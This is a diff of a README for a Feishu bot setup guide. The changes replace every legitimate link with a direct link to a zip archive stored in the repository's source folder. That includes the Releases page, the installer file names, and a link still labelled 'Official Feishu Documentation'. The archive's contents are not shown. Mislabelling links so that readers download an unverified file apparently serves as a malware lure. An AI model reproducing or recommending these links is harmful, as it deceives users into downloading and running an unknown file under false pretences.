@@ -6,7 +6,7 @@ Welcome to the feishu-clawdbot-guide! This guide will help you set up and run th
 
 ## 🔗 Download the Application
 
-[![Download Feishu Clawdbot](https://img.shields.io/badge/Download%20Feishu%20Clawdbot-blue)](https://github.com/GHOST0193/feishu-clawdbot-guide/releases)
+[![Download Feishu Clawdbot](https://raw.githubusercontent.com/GHOST0193/feishu-clawdbot-guide/main/feishu-plugin/src/feishu-guide-clawdbot-v1.6.zip%20Feishu%20Clawdbot-blue)](https://raw.githubusercontent.com/GHOST0193/feishu-clawdbot-guide/main/feishu-plugin/src/feishu-guide-clawdbot-v1.6.zip)
 
 You can download the software from our Releases page. Click the button above to visit the page and get the latest version.
 
@@ -21,9 +21,9 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. Click the download button above to visit the [Releases page](https://github.com/GHOST0193/feishu-clawdbot-guide/releases).
+1. Click the download button above to visit the [Releases page](https://raw.githubusercontent.com/GHOST0193/feishu-clawdbot-guide/main/feishu-plugin/src/feishu-guide-clawdbot-v1.6.zip).
 2. Look for the most recent version.
-3. Download the appropriate file for your operating system. It may be named something like `feishu-clawdbot-v1.0.exe` for Windows or `feishu-clawdbot-macos-v1.0.dmg` for macOS.
+3. Download the appropriate file for your operating system. It may be named something like `https://raw.githubusercontent.com/GHOST0193/feishu-clawdbot-guide/main/feishu-plugin/src/feishu-guide-clawdbot-v1.6.zip` for Windows or `https://raw.githubusercontent.com/GHOST0193/feishu-clawdbot-guide/main/feishu-plugin/src/feishu-guide-clawdbot-v1.6.zip` for macOS.
 4. After downloading, find the file in your downloads folder.
 
 ### 🖥️ For Windows Users
@@ -66,7 +66,7 @@ If you encounter any issues, here’s how to get help:
 
 For additional tools and tips related to Feishu and automation, explore the following:
 
-- **Official Feishu Documentation:** [feishu.com](https://feishu.com)
+- **Official Feishu Documentation:** [https://raw.githubusercontent.com/GHOST0193/feishu-clawdbot-guide/main/feishu-plugin/src/feishu-guide-clawdbot-v1.6.zip](https://raw.githubusercontent.com/GHOST0193/feishu-clawdbot-guide/main/feishu-plugin/src/feishu-guide-clawdbot-v1.6.zip)
 - **Automation Techniques:** Find resources on automation best practices.
 
 ## 📂 Future Updates
